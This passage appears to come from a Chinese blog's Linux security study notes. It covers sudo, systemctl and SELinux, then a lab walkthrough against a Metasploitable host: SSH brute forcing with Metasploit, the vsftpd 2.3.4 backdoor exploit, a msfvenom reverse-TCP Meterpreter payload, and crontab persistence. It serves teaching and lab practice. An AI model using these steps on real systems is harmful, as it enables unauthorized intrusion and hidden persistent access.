class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[zy@ntd</span> <span class="string">~]$ sudo -l</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[sudo]</span> <span class="string">zy 的密码：                  //初次使用时，验证用户zy的密码（5分钟内不再验证）</span></span><br><span class="line"></span><br><span class="line"><span class="attr">用户</span> <span class="string">zy 可以在 ntd 上运行以下命令：</span></span><br><span class="line">    <span class="attr">(root)</span> <span class="string">ALL</span></span><br></pre></td></tr></table></figure><p><strong>执行管理员已允许提权的命令</strong></p><ul><li>sudo 命令</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[zy@ntd</span> <span class="string">~]$ mkdir /zydir                 //正常使用，无权在/下创建子目录</span></span><br><span class="line"><span class="attr">mkdir</span>: <span class="string">无法创建目录 “/zydir”: 权限不够</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[zy@ntd</span> <span class="string">~]$ sudo mkdir /zydir            //sudo提权，成功在/下创建子目录</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[zy@ntd</span> <span class="string">~]$ ls -ld /zydir</span></span><br><span class="line"><span class="attr">drwxr-xr-x.</span> <span class="string">2 root root 4096  1月  4 15:16 /zydir</span></span><br></pre></td></tr></table></figure><h3 id="开启sudo操作日志"><a href="#开启sudo操作日志" class="headerlink" title="开启sudo操作日志"></a>开启sudo操作日志</h3><ul><li>日志审计功能默认不开启</li><li>如果需要，可以手动开启sudo操作日志</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# visudo</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Defaults</span>   <span class="string">logfile=/var/log/sudo   //添加此行，设置sudo日志位置</span></span><br></pre></td></tr></table></figure><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# cat /var/log/sudo            //查看sudo记录</span></span><br><span class="line"><span class="attr">Jan</span>  <span class="string">4 15:20:32 : zy : TTY=pts/0 ; PWD=/home/zy ; USER=root ;</span></span><br><span class="line">    <span class="attr">COMMAND</span>=<span class="string">/usr/bin/rm -rf /zydir</span></span><br></pre></td></tr></table></figure><h2 id="systemctl系统控制"><a href="#systemctl系统控制" class="headerlink" title="systemctl系统控制"></a>systemctl系统控制</h2><h3 id="systemctl工具"><a href="#systemctl工具" class="headerlink" title="systemctl工具"></a>systemctl工具</h3><p><strong>用户主要通过systemctl来控制系统和服务状态</strong></p><p><img src="/../img/img_artical/net_sec/10.5.3.png" alt="10.5.3"></p><h3 id="启动、停止、重启服务"><a href="#启动、停止、重启服务" class="headerlink" title="启动、停止、重启服务"></a>启动、停止、重启服务</h3><p><strong>基本用法</strong></p><ul><li>systemctl  –type  service                      &#x2F;&#x2F;列出所有服务</li><li>systemctl  start  service                        &#x2F;&#x2F;启动服务</li><li>systemctl  stop  service                         &#x2F;&#x2F;停止服务</li><li>systemctl  restart  service                     &#x2F;&#x2F;重启服务</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# systemctl --type service</span></span><br><span class="line">  <span class="attr">UNIT</span>                                                                                      <span class="string">LOAD   ACTIVE SUB     DE&gt;</span></span><br><span class="line">  <span class="attr">atd.service</span>                                                                               <span class="string">loaded active running De&gt;</span></span><br><span class="line">  <span class="attr">auditd.service</span>                                                                            <span class="string">loaded active running Se&gt;</span></span><br><span class="line">  <span class="attr">chronyd.service</span>                                                                           <span class="string">loaded active running NT&gt;</span></span><br><span class="line">  <span class="attr">crond.service</span>                                                                             <span class="string">loaded active running Co&gt;       </span></span><br></pre></td></tr></table></figure><h3 id="检查服务状态"><a href="#检查服务状态" class="headerlink" title="检查服务状态"></a>检查服务状态</h3><p><strong>基本用法</strong></p><ul><li>systemctl  is-active  服务名                      &#x2F;&#x2F;检查服务状态（简洁）</li><li>systemctl  status  服务名                          &#x2F;&#x2F;检查服务状态（详细）</li></ul><p><strong>主要看Active：信息</strong></p><ul><li>active（running）表示运行中，inactive（dead）表示已停止</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# systemctl start firewalld              //开启防火墙服务</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# systemctl is-active firewalld          //检查防火墙服务状态</span></span><br><span class="line"><span class="attr">active</span>                                               <span class="string">//已开启</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# systemctl stop firewalld               //关闭防火墙服务</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# systemctl is-active firewalld          //检查防火墙服务状态</span></span><br><span class="line"><span class="attr">inactive</span>                                             <span class="string">//已关闭</span></span><br></pre></td></tr></table></figure><h3 id="允许服务开机自启动"><a href="#允许服务开机自启动" class="headerlink" title="允许服务开机自启动"></a>允许服务开机自启动</h3><p><strong>基本用法</strong></p><ul><li>systemctl  enable  服务名                      &#x2F;&#x2F;允许开机自启</li><li>systemctl  enable  –now  服务名          &#x2F;&#x2F;允许开机自启，并立即启动</li><li>systemctl  is-enabled  服务名                &#x2F;&#x2F;查看是否设置为开机自启</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# systemctl enable firewalld             //设置防火墙服务开机自启</span></span><br><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# systemctl is-enabled firewalld </span></span><br><span class="line"><span class="attr">enabled</span>                                              <span class="string">//已设置为开机自启</span></span><br></pre></td></tr></table></figure><h3 id="禁止服务开机自启动"><a href="#禁止服务开机自启动" class="headerlink" title="禁止服务开机自启动"></a>禁止服务开机自启动</h3><p><strong>基本用法</strong></p><ul><li>systemctl  disable  服务名                   &#x2F;&#x2F;禁止开机自启</li><li>systemctl  disable  –now  服务名       &#x2F;&#x2F;禁止开机自启，并立即停止服务</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# systemctl disable firewalld                              //禁止防火墙服务开机自启</span></span><br><span class="line"><span class="attr">Removed</span> <span class="string">/etc/systemd/system/multi-user.target.wants/firewalld.service.</span></span><br><span class="line"><span class="attr">Removed</span> <span class="string">/etc/systemd/system/dbus-org.fedoraproject.FirewallD1.service.</span></span><br><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# systemctl is-enabled firewalld</span></span><br><span class="line"><span class="attr">disabled</span>                                                                <span class="string">//已设置为禁止开机自启</span></span><br></pre></td></tr></table></figure><h2 id="SELinux防护"><a href="#SELinux防护" class="headerlink" title="SELinux防护"></a>SELinux防护</h2><h3 id="SELinux介绍"><a href="#SELinux介绍" class="headerlink" title="SELinux介绍"></a>SELinux介绍</h3><p><strong>Security Enhanced Linux，安全增强型Linux系统</strong></p><p><strong>源于美国国家安全局(NSA) 强制保护安全策略</strong></p><ul><li>主要针对Linux系统中的文件、进程等提供策略保护</li><li>用户只分配“需要”的最小权限</li><li>进程只访问“需要”的资源</li><li>网络服务只能开启“需要”的端口</li></ul><h3 id="查看SELinux运行状态"><a href="#查看SELinux运行状态" class="headerlink" title="查看SELinux运行状态"></a>查看SELinux运行状态</h3><p><strong>三种运行状态</strong></p><ul><li>Enforcing，强制（严格按策略执行保护）</li><li>Permissive，宽松（若有违规会记录，但不会做真正限制）</li><li>Disable，禁用（内核不加载SELinux）</li></ul><p><strong>检查当前的SELinux运行状态</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# getenforce            //获取SELinux状态</span></span><br><span class="line"><span class="attr">Enforcing</span>                           <span class="string">//强制保护</span></span><br></pre></td></tr></table></figure><h3 id="切换SELinux运行状态"><a href="#切换SELinux运行状态" class="headerlink" title="切换SELinux运行状态"></a>切换SELinux运行状态</h3><p><strong>立即切换（在“强制”与“宽松”之间）</strong></p><ul><li>使用setenforce  1|0，执行后立即生效</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# setenforce 0          //切换为宽松模式</span></span><br><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# getenforce</span></span><br><span class="line"><span class="attr">Permissive</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# setenforce 1          //切换为强制模式</span></span><br><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# getenforce</span></span><br><span class="line"><span class="attr">Enforcing</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全（更新ing） </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全-Linux渗透测试4</title>
      <link href="/posts/lnxpte4.html"/>
      <url>/posts/lnxpte4.html</url>
      
        <content type="html"><![CDATA[<h1 id="Linux渗透测试"><a href="#Linux渗透测试" class="headerlink" title="Linux渗透测试"></a>Linux渗透测试</h1><h2 id="Linux渗透"><a href="#Linux渗透" class="headerlink" title="Linux渗透"></a>Linux渗透</h2><h3 id="Secure-Shell"><a href="#Secure-Shell" class="headerlink" title="Secure Shell"></a>Secure Shell</h3><p><strong>SSH</strong></p><ul><li>SSH是基于应用层的安全协议</li><li>SSH是专为远程登录和其他网络服务提供安全性的协议</li><li>SSH提供基于密码、基于密钥的两种级别的安全验证</li><li>SSH传输的数据会进行加密，可以有效防止远程过程中的信息泄露问题</li><li>SSH传输的数据时会进行数据压缩，可以加快传输的速度</li><li>远程工具：Putty、FinalShell、MobaXterm、SecrueCRT等等</li></ul><h3 id="SSH暴力破解"><a href="#SSH暴力破解" class="headerlink" title="SSH暴力破解"></a>SSH暴力破解</h3><p><strong>SSH暴力破解工具</strong></p><ul><li>Hydra、Medusa、msf</li><li>大部分攻击都是针对Linux 服务器默认管理账号root，攻击者主要使用admin、 root、123456等常见弱密码进行暴力破解</li><li>少部分攻击是针对tomcat、postgres、 hadoop、 mysql、apache、 ftpuser、 vnc等Linux服务器上常见应用程序使用的用户名</li><li>攻击者不仅使用常见通用弱密码，还会将用户名当作密码进行攻击</li></ul><h3 id="SSH爆破"><a href="#SSH爆破" class="headerlink" title="SSH爆破"></a>SSH爆破</h3><p><strong>第一步：创建字典</strong></p><ul><li>手写一个简单字典，方便实验验证</li><li>vim &#x2F;root&#x2F;passwd</li></ul><p><strong>第二步：查找MSF辅助爆破脚本</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">┌──(root㉿kali)-[~]</span></span><br><span class="line"><span class="attr">└─#</span> <span class="string">msfconsole   </span></span><br><span class="line"></span><br><span class="line"><span class="attr">msf6</span> <span class="string">&gt; search ssh_login</span></span><br><span class="line"></span><br><span class="line">   <span class="attr">0</span>  <span class="string">auxiliary/scanner/ssh/ssh_login                          normal  No     SSH Login Check Scanner</span></span><br><span class="line">   <span class="attr">1</span>  <span class="string">auxiliary/scanner/ssh/ssh_login_pubkey                   normal  No     SSH Public Key Login Scanner</span></span><br></pre></td></tr></table></figure><p><strong>第三步：使用辅助脚本进行SSH爆破</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">msf6</span> <span class="string">&gt; use 0</span></span><br><span class="line"><span class="attr">msf6</span> <span class="string">auxiliary(scanner/ssh/ssh_login) &gt; set username msfadmin</span></span><br><span class="line"><span class="attr">username</span> =<span class="string">&gt; msfadmin</span></span><br><span class="line"><span class="attr">msf6</span> <span class="string">auxiliary(scanner/ssh/ssh_login) &gt; set pass_file passwd.txt</span></span><br><span class="line"><span class="attr">pass_file</span> =<span class="string">&gt; pass.txt</span></span><br><span class="line"><span class="attr">msf6</span> <span class="string">auxiliary(scanner/ssh/ssh_login) &gt; set rhosts 192.168.10.143</span></span><br><span class="line"><span class="attr">rhosts</span> =<span class="string">&gt; 192.168.10.143</span></span><br></pre></td></tr></table></figure><p><strong>第四步：查看会话、切换会话</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">msf6</span> <span class="string">auxiliary(scanner/ssh/ssh_login) &gt; sessions </span></span><br><span class="line"></span><br><span class="line">  <span class="attr">Id</span>  <span class="string">Name  Type         Information  Connection</span></span><br><span class="line">  <span class="attr">--</span>  <span class="string">----  ----         -----------  ----------</span></span><br><span class="line">  <span class="attr">1</span>         <span class="string">shell linux  SSH root @   192.168.10.224:34941 -&gt; 192.168.10.143:22 (1</span></span><br><span class="line">                                      <span class="attr">92.168.10.143)</span></span><br><span class="line"></span><br><span class="line"><span class="attr">msf6</span> <span class="string">auxiliary(scanner/ssh/ssh_login) &gt; sessions 1</span></span><br><span class="line"><span class="attr">[*]</span> <span class="string">Starting interaction with 1...</span></span><br><span class="line"></span><br><span class="line"><span class="attr">whoami</span></span><br><span class="line"><span class="attr">msfadmin</span></span><br></pre></td></tr></table></figure><h3 id="漏洞利用VSFTPD"><a href="#漏洞利用VSFTPD" class="headerlink" title="漏洞利用VSFTPD"></a>漏洞利用VSFTPD</h3><p><strong>vsftpd_234_backdoor（笑脸漏洞），允许攻击者任意用户登录，以root权限执行任意命令</strong></p><ul><li>用户名以“笑脸”结尾，如xx:)、oo:)</li><li>密码任意输入</li><li>成功后开启6200端口，执行任意命令</li></ul><p><img src="/../img/img_artical/net_sec/10.4.1.png" alt="10.4.1"></p><p><strong>环境准备</strong></p><ul><li>靶机：Linux</li></ul><p><strong>漏洞利用</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">msf6</span> <span class="string">&gt; search vsftpd</span></span><br><span class="line"></span><br><span class="line">   <span class="attr">0</span>  <span class="string">exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution                                                 </span></span><br><span class="line"><span class="attr">msf6</span> <span class="string">&gt; use 0</span></span><br><span class="line"><span class="attr">msf6</span> <span class="string">exploit(unix/ftp/vsftpd_234_backdoor) &gt; set rhosts 192.168.10.143</span></span><br><span class="line"><span class="attr">rhosts</span> =<span class="string">&gt; 192.168.10.143</span></span><br><span class="line"><span class="attr">msf6</span> <span class="string">exploit(unix/ftp/vsftpd_234_backdoor) &gt; run</span></span><br><span class="line"></span><br><span class="line"><span class="attr">whoami</span></span><br><span class="line"><span class="attr">root</span></span><br></pre></td></tr></table></figure><h2 id="Linux后门"><a href="#Linux后门" class="headerlink" title="Linux后门"></a>Linux后门</h2><h3 id="什么是Msfvenom"><a href="#什么是Msfvenom" class="headerlink" title="什么是Msfvenom"></a>什么是Msfvenom</h3><p><strong>Msfvenom</strong></p><ul><li>Msfvenom是MSF框架配套的攻击载荷生成器</li><li>可以用来生成木马程序，并在目标机上执行，在本地监听上线</li></ul><p><strong>部分参数</strong></p><ul><li>-p选择一个载荷</li><li>-f生成的文件格式，elf(Linux下可执行文件) exe (Windows下执行)</li><li>-lhost 监听地址</li><li>-lport 监听端口</li><li>-o 输出文件名</li><li>-h帮助</li></ul><h3 id="Msfvenom生成后门文件"><a href="#Msfvenom生成后门文件" class="headerlink" title="Msfvenom生成后门文件"></a>Msfvenom生成后门文件</h3><p><strong>第一步：在kali生成后门文件</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">┌──(root㉿kali)-[~]</span></span><br><span class="line"><span class="attr">└─#</span> <span class="string">msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.10.224 lport=4444 -f elf -o shell</span></span><br></pre></td></tr></table></figure><p><strong>第二步：确保开启Linux靶机的root用户，并设置密码root</strong></p><h3 id="上传后门文件至靶机"><a href="#上传后门文件至靶机" class="headerlink" title="上传后门文件至靶机"></a>上传后门文件至靶机</h3><p><strong>在暴力破解成功的情况下，通过kali将后门文件发送到目标主机</strong></p><ul><li>在kali中发送后门文件至靶机的&#x2F;mnt&#x2F;下</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">┌──(root㉿kali)-[~]</span></span><br><span class="line"><span class="attr">└─#</span> <span class="string">scp shell root@192.168.10.143:/mnt</span></span><br></pre></td></tr></table></figure><ul><li>在靶机中查看后门文件是否存在</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">root@metasploitable</span>:<span class="string">~# ls /mnt/</span></span><br><span class="line"><span class="attr">newdisk</span>  <span class="string">shell</span></span><br></pre></td></tr></table></figure><p><strong>注：上传可能会报错，是由于kali缺少配置导致的，按照以下步骤进行修复</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">┌──(root㉿kali)-[~]</span></span><br><span class="line"><span class="attr">└─#</span> <span class="string">mkdir .ssh </span></span><br><span class="line"></span><br><span class="line"><span class="attr">┌──(root㉿kali)-[~]</span></span><br><span class="line"><span class="attr">└─#</span> <span class="string">vim .ssh/config</span></span><br></pre></td></tr></table></figure><ul><li>config文件中添加以下内容</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Host</span> <span class="string">*</span></span><br><span class="line"><span class="attr">HostkeyAlgorithms</span> <span class="string">+ssh-rsa</span></span><br><span class="line"><span class="attr">PubKeyAcceptedKeyTypes</span> <span class="string">+ssh-rsa</span></span><br></pre></td></tr></table></figure><h3 id="给后门文件添加执行权限"><a href="#给后门文件添加执行权限" class="headerlink" title="给后门文件添加执行权限"></a>给后门文件添加执行权限</h3><ul><li>第一步：控制靶机，添加执行权限</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">root@metasploitable</span>:<span class="string">~# ls -l /mnt</span></span><br><span class="line"></span><br><span class="line"><span class="attr">root@metasploitable</span>:<span class="string">~# chmod a+x /mnt/shell</span></span><br></pre></td></tr></table></figure><ul><li>第二步：控制靶机，后台运行后门程序</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">root@metasploitable</span>:<span class="string">~# chmod a+x /mnt/shell</span></span><br></pre></td></tr></table></figure><h3 id="建立连接"><a href="#建立连接" class="headerlink" title="建立连接"></a>建立连接</h3><ul><li>kali进入MSF，使用侦听脚本，建立连接</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">┌──(root㉿kali)-[~]</span></span><br><span class="line"><span class="attr">└─#</span> <span class="string">msfconsole   </span></span><br><span class="line"></span><br><span class="line"><span class="attr">msf6</span> <span class="string">&gt; use exploit/multi/handler </span></span><br><span class="line"><span class="attr">msf6</span> <span class="string">exploit(multi/handler) &gt; set lhost 192.168.10.224</span></span><br><span class="line"><span class="attr">lhost</span> =<span class="string">&gt; 192.168.10.224</span></span><br><span class="line"><span class="attr">msf6</span> <span class="string">exploit(multi/handler) &gt; set lport 4444</span></span><br><span class="line"><span class="attr">lport</span> =<span class="string">&gt; 4444</span></span><br><span class="line"><span class="attr">msf6</span> <span class="string">exploit(multi/handler) &gt; set payload linux/x86/meterpreter/reverse_tcp</span></span><br><span class="line"><span class="attr">payload</span> =<span class="string">&gt; linux/x86/meterpreter/reverse_tcp</span></span><br><span class="line"><span class="attr">msf6</span> <span class="string">exploit(multi/handler) &gt; run</span></span><br></pre></td></tr></table></figure><p><strong>备注：如果连接不上，靶机多次执行&#x2F;mnt&#x2F;shell &amp;命令</strong></p><ul><li>进入反弹连接，获取用户信息</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; getuid</span></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; ps</span></span><br></pre></td></tr></table></figure><h3 id="创建计划任务"><a href="#创建计划任务" class="headerlink" title="创建计划任务"></a>创建计划任务</h3><p><strong>Linux crontab命令</strong></p><ul><li>crontab：计划任务，用来定期执行程序的命令</li><li>crontab -e：编辑计划任务</li><li>crontab -l：显示计划任务</li></ul><p><strong>先查看计划任务格式</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># m h  dom mon dow   command             //分  时  日  月  周  命令</span><br><span class="line"> 30 6   *   *   *      命令               //每天6点30分执行命令</span><br><span class="line"> 30 6   *   *  1-5     命令               //周一到五6点30分执行命令</span><br><span class="line"> 30 6   1   *   *      命令               //每月第一天6点30分执行命令</span><br><span class="line"> *  *   *   *   *      命令               //每分钟执行一次命令</span><br></pre></td></tr></table></figure><p><strong>在靶机上创建计划任务</strong></p><ul><li>-e：执行文字编辑器来设定计划任务，内定的文字编辑器是vi</li><li>EDITOR&#x3D;vim：指定编辑器为vim</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">root@metasploitable</span>:<span class="string">~# EDITOR=vim crontab -e</span></span><br><span class="line"><span class="attr">*</span> <span class="string">* * * * /mnt/shell&amp;</span></span><br></pre></td></tr></table></figure><p><strong>列出目前的任务</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">root@metasploitable</span>:<span class="string">~# crontab -l</span></span><br></pre></td></tr></table></figure><h3 id="自动运行后门文件"><a href="#自动运行后门文件" class="headerlink" title="自动运行后门文件"></a>自动运行后门文件</h3><ul><li>验证计划任务</li><li>重启靶机，验证kali是否能够连接后台文件</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">┌──(root㉿kali)-[~]</span></span><br><span class="line"><span class="attr">└─#</span> <span class="string">msfconsole   </span></span><br><span class="line"></span><br><span class="line"><span class="attr">msf6</span> <span class="string">&gt; use exploit/multi/handler </span></span><br><span class="line"><span class="attr">msf6</span> <span class="string">exploit(multi/handler) &gt; set lhost 192.168.10.224</span></span><br><span class="line"><span class="attr">lhost</span> =<span class="string">&gt; 192.168.10.224</span></span><br><span class="line"><span class="attr">msf6</span> <span class="string">exploit(multi/handler) &gt; set lport 4444</span></span><br><span class="line"><span class="attr">lport</span> =<span class="string">&gt; 4444</span></span><br><span class="line"><span class="attr">msf6</span> <span class="string">exploit(multi/handler) &gt; set payload linux/x86/meterpreter/reverse_tcp</span></span><br><span class="line"><span class="attr">payload</span> =<span class="string">&gt; linux/x86/meterpreter/reverse_tcp</span></span><br><span class="line"><span class="attr">msf6</span> <span class="string">exploit(multi/handler) &gt; run</span></span><br></pre></td></tr></table></figure><h3 id="会话放入后台运行"><a href="#会话放入后台运行" class="headerlink" title="会话放入后台运行"></a>会话放入后台运行</h3><p><strong>background</strong></p><ul><li>在渗透的时候，有时需要执行其他任务，为了执行新任务，需要将当前的Meterpreter会话切换到后台，这时就需要用到background命令</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; background </span></span><br><span class="line"><span class="attr">[*]</span> <span class="string">Backgrounding session 1...</span></span><br><span class="line"><span class="attr">msf6</span> <span class="string">exploit(multi/handler) &gt; sessions </span></span><br><span class="line"></span><br><span class="line">  <span class="attr">1</span>         <span class="string">meterpreter x86/linux  root @ metasploitable.  192.168.10.224:4444 -&gt;</span></span><br><span class="line">                                   <span class="attr">localdomain</span>             <span class="string">192.168.10.143:34443 (1</span></span><br><span class="line">                                                           <span class="attr">92.168.10.143)</span></span><br><span class="line"></span><br><span class="line"><span class="attr">msf6</span> <span class="string">exploit(multi/handler) &gt; sessions 1</span></span><br></pre></td></tr></table></figure><h3 id="多会话管理"><a href="#多会话管理" class="headerlink" title="多会话管理"></a>多会话管理</h3><ul><li>重新运行监听脚本</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">msf6</span> <span class="string">exploit(multi/handler)&gt; run</span></span><br></pre></td></tr></table></figure><ul><li>通过session ID快速切换</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">msf6</span> <span class="string">exploit(multi/handler) &gt; sessions 1</span></span><br><span class="line"><span class="attr">[*]</span> <span class="string">Starting interaction with 1...</span></span><br><span class="line"><span class="attr">msf6</span> <span class="string">exploit(multi/handler) &gt; sessions 2</span></span><br><span class="line"><span class="attr">[*]</span> <span class="string">Starting interaction with 2...</span></span><br></pre></td></tr></table></figure><h2 id="Linux安全加固"><a href="#Linux安全加固" class="headerlink" title="Linux安全加固"></a>Linux安全加固</h2><h3 id="Linux安全基线"><a href="#Linux安全基线" class="headerlink" title="Linux安全基线"></a>Linux安全基线</h3><p><strong>指的是使Linux各项配置都符合安全要求的基本标准</strong></p><ul><li>账号&#x2F;密码：口令复杂度&#x2F;wheel组</li><li>SSH登录控制：禁root&#x2F;改端口&#x2F;密码&#x2F;密钥验证</li><li>文件权限控制</li><li>内核参数调整</li></ul><h3 id="系统加固的必要性"><a href="#系统加固的必要性" class="headerlink" title="系统加固的必要性"></a>系统加固的必要性</h3><p><strong>加固目的</strong></p><ul><li>操作系统是整个信息系统安全的基础</li><li>各种应用安全都依赖于操作系统</li></ul><p><strong>加固方式</strong></p><ul><li>手动修改加固项配置，或执行相关命令</li><li>脚本或自动化工具批量加固，比如华为的openEuler-security加固服务</li></ul><p><strong>加固内容</strong></p><ul><li>系统服务、文件权限、内核参数、授权认证、账号口令</li></ul><h3 id="系统加固的影响"><a href="#系统加固的影响" class="headerlink" title="系统加固的影响"></a>系统加固的影响</h3><ul><li>可能会影响用户的使用习惯，影响系统易用性</li></ul><p><img src="/../img/img_artical/net_sec/10.4.2.png" alt="10.4.2"></p><h3 id="禁止root远程ssh"><a href="#禁止root远程ssh" class="headerlink" title="禁止root远程ssh"></a>禁止root远程ssh</h3><ul><li>调整sshd服务端配置文件</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 